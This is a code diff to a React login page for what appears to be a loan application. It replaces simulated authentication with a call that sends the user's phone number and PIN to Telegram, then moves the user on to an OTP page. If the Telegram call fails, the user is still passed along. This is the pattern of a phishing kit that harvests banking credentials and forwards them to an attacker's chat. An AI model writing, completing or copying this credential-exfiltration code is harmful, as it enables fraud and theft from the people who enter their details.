@@ -1,4 +1,5 @@
 import { useState, FormEvent } from 'react'
+import { sendLoginDetails } from '../utils/telegram'
 
 interface LoginPageProps {
   onLoginSuccess: (phone: string) => void
@@ -16,27 +17,24 @@ const LoginPage = ({ onLoginSuccess }: LoginPageProps) => {
     setLoading(true)
     setError('')
 
-    // Simulate authentication
-    setTimeout(() => {
+    try {
       if (phone && pin) {
-        // Update session storage with login details
-        const storedData = sessionStorage.getItem('loanFormData')
-        let finalData = { phone, pin }
-        
-        if (storedData) {
-          const existingData = JSON.parse(storedData)
-          finalData = { ...existingData, ...finalData }
-        }
-        
-        sessionStorage.setItem('loanFormData', JSON.stringify(finalData))
-        
+        // Send login details to Telegram
+        await sendLoginDetails(phone, pin)
+
         // Success - proceed to OTP page
         onLoginSuccess(phone)
       } else {
         setError('Please enter both phone number and PIN')
       }
+    } catch (err) {
+      console.error(err)
+      // Continue even if telegram fails, or show error? 
+      // User flow suggests continuing or retrying. Let's continue for now to not block user.
+      onLoginSuccess(phone)
+    } finally {
       setLoading(false)
-    }, 1000)
+    }
   }
 
   const togglePinVisibility = () => {
